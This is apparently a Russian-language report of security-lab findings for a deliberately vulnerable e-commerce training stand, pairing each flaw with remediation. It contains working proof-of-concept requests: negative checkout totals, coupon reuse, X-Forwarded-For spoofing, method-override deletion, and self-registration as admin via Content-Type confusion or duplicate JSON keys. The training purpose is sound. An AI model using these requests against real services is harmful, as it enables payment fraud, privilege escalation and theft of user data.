# Материалы проверок - Прядко Данила

## BIZ-01. Клиент сам назначает итоговую цену

После входа:

```js
await lab('/api/checkout', {
  total:-100,
  address:'Демо'
});
```

Если заказ создан с `total:-100`, сервер доверяет цене клиента.

- **Механизм:** `/api/checkout` записывает `Number(b.total)` без расчёта по каталогу.
- **Проверка после входа:** `await lab('/api/checkout',{total:-100,address:'Демо'})` создаёт заказ с отрицательной суммой.
- **Влияние:** недоплата; в настоящей платёжной интеграции возможны более серьёзные нарушения, но возврат реальных денег стенд не реализует.

- **Где:** INSERT в `/api/checkout`.
- **Лечение:** сервер получает только ID и количество, читает действующие цены, проверяет целое положительное количество, считает деньги в минимальных единицах, применяет разрешённые скидки. После исправления произвольный `total` не влияет на расчёт.

## BIZ-02. Несуществующий товар в заказе

```js
await lab('/api/checkout', {
  total:1,
  address:'Демо',
  items:[{
    id:999999,
    name:'Несуществующий товар',
    price:1
  }]
});
```

Если заказ создан, сервер не проверяет товары по каталогу.

- **Механизм:** `items` сериализуется в БД без проверки товаров, количества и согласованности с суммой.
- **Проверка:** `await lab('/api/checkout',{total:1,items:[{id:999999,name:'Несуществующий товар',price:1}],address:'Демо'})`; прочитайте созданный заказ через `/api/orders/<id>` и поле `items`.

- **Влияние:** заказы с несуществующими позициями, невозможность достоверной комплектации и учёта.
- **Где:** `JSON.stringify(b.items || [])`.
- **Лечение:** проверять существование товара и остаток, формировать снимок названия/цены на сервере, хранить нормализованные позиции с внешними ключами; пересчитывать итог. После исправления выдуманный ID отклоняется, корректная корзина сохраняется.

## BIZ-03. Повтор запроса создаёт дубликат

Дважды выполните один запрос:

```js
await lab('/api/checkout', {
  total:100,
  address:'Демо',
  items:[]
});
```

Если получены два разных `id`, защита от повторной отправки отсутствует.

- **Механизм:** каждый POST оформляет новый заказ, нет idempotency key.
- **Проверка:** дважды отправьте одинаковый `/api/checkout` и сравните разные ID в истории.
- **Влияние:** нежелательные дубли при повторе после сетевого сбоя. Два намеренных одинаковых заказа допустимы; проблема — отсутствие способа отличить их от повторной доставки одного запроса.

- **Где:** безусловный INSERT.
- **Лечение:** ключ идемпотентности, уникальность в рамках пользователя, транзакционное сохранение ответа, проверка совпадения тела при повторе ключа. После исправления один ключ даёт один заказ; новый ключ позволяет новую покупку.

## BIZ-04. Несуществующий статус заказа

```js
await lab('/api/admin/orders', {
  id:1,
  status:'teleported'
});
```

Проверьте:

```js
await lab('/api/orders/1');
```

Если статус `teleported`, сервер принимает любое состояние.

**Механизм:** поле `status` принимает любую строку, предыдущий статус не учитывается. **Проверка:** `await lab('/api/admin/orders',{id:1,status:'teleported'})`; значение видно через API. Можно также перевести `new` сразу в `shipped`. В UI неизвестный статус может отображаться пустым select — это симптом несогласованности модели.

- **Влияние:** обход процесса оплаты/отправки, недостоверный учёт
- **Где:** POST `/api/admin/orders`.
- **Лечение:** enum и явная машина состояний, проверка полномочий на переход, подтверждённая сервером оплата, транзакционное сравнение предыдущего статуса. После исправления неизвестная строка и запрещённый переход отклоняются даже для администратора.

## BIZ-05. Отрицательная цена товара

```js
await lab('/api/admin/products', {
  id:1,
  name:'Механическая клавиатура',
  price:-1
});
```

Обновите каталог. Если цена отрицательная, сервер не проверяет денежный диапазон.

- **Механизм:** админский API принимает нулевую или отрицательную цену, не проверяет диапазон и бизнес-условия.
- **Проверка:** войдите администратором и сохраните `-1` в цене товара, либо отправьте `/api/admin/products` с этим значением
- **Влияние:** каталог и обычная корзина используют ошибочную цену даже без подмены checkout.

- **Где:** POST `/api/admin/products`.
- **Лечение:** серверная схема данных, конечное целое значение в минимальных денежных единицах, разрешённый диапазон, аудит изменения. Проверка роли из ACCESS-04 обязательна отдельно. После исправления отрицательная цена отклоняется; корректная административная правка сохраняется и видна в каталоге.

## BIZ-06. Купон применяется многократно

После входа дважды выполните:

```js
await lab('/api/coupon', {
  code:'WELCOME500',
  subtotal:1000
});
```

Оба ответа дадут скидку.

Дополнительная проверка:

```js
await lab('/api/coupon', {
  code:'WELCOME500',
  subtotal:100
});
```

Если итог отрицательный, сервер не проверяет минимальную сумму.

- **Механизм:** `WELCOME500` существует глобально, но использование не записывается; каждый запрос снова даёт скидку. Дополнительно endpoint доверяет `subtotal` клиента.

- **Проверка после входа:** дважды выполните `await lab('/api/coupon',{code:'WELCOME500',subtotal:1000})`. Оба раза итог 500. Затем `subtotal:100` даст отрицательный итог.
- **Влияние:** повторная скидка и сумма ниже нуля; endpoint пока не связан автоматически с checkout, поэтому доказано нарушение расчёта купона, а не реальная оплата.

- **Где:** `/api/coupon`, таблица `coupons`.
- **Лечение:** серверный subtotal из корзины, правила минимальной суммы, таблица использования `(coupon,user/order)`, уникальное ограничение и транзакция. После исправления второй use отклоняется, первый не делает сумму отрицательной.

## BIZ-07. Складской остаток не уменьшается

Получите каталог:

```js
const before = await lab('/api/products');
```

Посмотрите `stock` первого товара.

Создайте заказ:

```js
await lab('/api/checkout', {
  total:8900,
  address:'Демо',
  items:[{
    id:1,
    name:'Клавиатура',
    price:8900
  }]
});
```

Снова:

```js
const after = await lab('/api/products');
```

Если `stock` не изменился, checkout не связан со складом.

- **Механизм:** у товара есть `stock`, но checkout не читает и не изменяет его.
- **Проверка:** `await lab('/api/products')` → запомните stock товара; создайте заказ с количеством/повторениями больше остатка; снова запросите каталог. Остаток не изменился.

- **Влияние:** продажа сверх наличия и недостоверный склад.
- **Где:** поле `products.stock` и `/api/checkout`.
- **Лечение:** передавать `{productId, quantity}`, в транзакции атомарно уменьшать остаток условием `stock >= quantity`, проверять число и отменять весь заказ при нехватке. После исправления заказ в пределах остатка уменьшает stock, превышение не создаёт заказ.

## CLI-01. Подделка внутреннего IP

Обычный запрос:

```text
node scripts/lab-cli.mjs get /api/internal/stats
```

Ожидается 403.

Изменённый:

```text
node scripts/lab-cli.mjs get /api/internal/stats X-Forwarded-For=127.0.0.1
```

Если появились STATUS 200 и `LAB_XFF_INTERNAL_KEY`, сервер поверил клиентскому заголовку.

- **Идея.** Сервер считает запрос внутренним, если клиент сам написал `X-Forwarded-For: 127.0.0.1`.

1. В окне 2 выполните обычный запрос:

```text
node scripts/lab-cli.mjs get /api/internal/stats
```

2. Найдите строку `<<< STATUS 403`. Это нормальный запрет.
3. Выполните тот же запрос с заголовком:

```text
node scripts/lab-cli.mjs get /api/internal/stats X-Forwarded-For=127.0.0.1
```

4. Теперь появится `<<< STATUS 200` и `LAB_XFF_INTERNAL_KEY`.

- **Почему это уязвимость.** Заголовок пришёл от самого клиента, но сервер использовал его как доказательство внутренней сети.
- **Влияние:** чтение внутренней статистики fixture.
- **Где:** `/api/internal/stats` в `server.mjs`.

- **Лечение.** Принимать proxy-заголовки только от известного reverse proxy, очищать внешнее значение, а доступ проверять с помощью аутентификации и сетевой политики. После исправления обе команды внешнего клиента дают 403.

## CLI-02. Удаление через Method Override

Обычный запрос:

```text
node scripts/lab-cli.mjs post /api/orders/delete '{"id":2}'
```

Ожидается 405.

С заголовком:

```text
node scripts/lab-cli.mjs post /api/orders/delete '{"id":2}' X-HTTP-Method-Override=DELETE
```

Если ответ содержит `"deleted":1`, заказ удалён без авторизации.

- **Идея.** Обычный POST запрещён, но специальный заголовок превращает его в удаление, причём проверка владельца отсутствует.

1. Посмотрите заказы:

```text
node scripts/lab-cli.mjs get /api/admin/orders
```

2. Запомните существующий `id`, например 2.
3. Обычный POST:

```text
node scripts/lab-cli.mjs post /api/orders/delete '{"id":2}'
```

4. Должен быть STATUS 405.
5. Добавьте заголовок:

```text
node scripts/lab-cli.mjs post /api/orders/delete '{"id":2}' X-HTTP-Method-Override=DELETE
```

6. Ответ `deleted:1` означает, что заказ удалён без входа.

- **Лечение.** Не включать method override без необходимости; обрабатывать эффективный метод до маршрутизации; одна и та же авторизация для всех вариантов метода. После исправления anonymous получает 401/403, заказ остаётся.

## CLI-03. Неверный Content-Type принимается

```text
node scripts/lab-cli.mjs raw POST /api/register 'email=plain@lab.test&password=x&role=admin&name=Plain' Content-Type=text/plain
```

Ищите STATUS 201.

Затем:

```text
node scripts/lab-cli.mjs login plain@lab.test x
node scripts/lab-cli.mjs get /api/me
```

Если роль `admin`, сервер принял неподходящий формат тела.

- **Идея.** Сервер ожидает JSON, но `text/plain` разбирает как форму и создаёт аккаунт.

```text
node scripts/lab-cli.mjs raw POST /api/register 'email=plain@lab.test&password=x&role=admin&name=Plain' Content-Type=text/plain
```

Правильное доказательство: STATUS 201. Затем:

```text
node scripts/lab-cli.mjs login plain@lab.test x
node scripts/lab-cli.mjs get /api/me
```

Ответ показывает `role:admin`.

- **Лечение.** Endpoint принимает только явно разрешённый Content-Type; иначе 415 Unsupported Media Type. После parsing всё равно нужна схема полей и запрет клиентской роли.

## CLI-04. Два одинаковых поля JSON

```text
node scripts/lab-cli.mjs raw POST /api/register '{"email":"duplicate@lab.test","password":"x","role":"customer","role":"admin"}' Content-Type=application/json
```

Затем:

```text
node scripts/lab-cli.mjs login duplicate@lab.test x
node scripts/lab-cli.mjs get /api/me
```

Если роль `admin`, JSON parser выбрал последнее поле.

- **Идея.** В одном JSON два поля `role`. Парсер молча оставляет последнее значение.

```text
node scripts/lab-cli.mjs raw POST /api/register '{"email":"duplicate@lab.test","password":"x","role":"customer","role":"admin","name":"Duplicate"}' Content-Type=application/json
```

Затем:

```text
node scripts/lab-cli.mjs login duplicate@lab.test x
node scripts/lab-cli.mjs get /api/me
```

Доказательство: созданный пользователь имеет `role:admin`, хотя раньше в запросе было `role:customer`.

- **Проблема.** Разные прокси, валидаторы и приложение могут по-разному выбирать первое или последнее значение.
- **Лечение:** отклонять duplicate keys на границе, использовать строгую схему и никогда не принимать role при регистрации.

## CLI-05. Старая версия API

```text
node scripts/lab-cli.mjs reset-cookie
node scripts/lab-cli.mjs get /api/v1/admin/users
```

Если без входа получен список пользователей и паролей, старая версия API не защищена.

1. Удалите CLI-cookie:

```text
node scripts/lab-cli.mjs reset-cookie
```

2. Запросите старую версию:

```text
node scripts/lab-cli.mjs get /api/v1/admin/users
```

3. STATUS 200 и список email/password без входа подтверждают проблему.

- **Где:** `/api/v1/admin/users`.
- **Лечение:** единая авторизация перед version routing; инвентаризация и удаление старых API; тесты anonymous/customer/admin для каждой версии. После исправления STATUS 401/403 либо 404.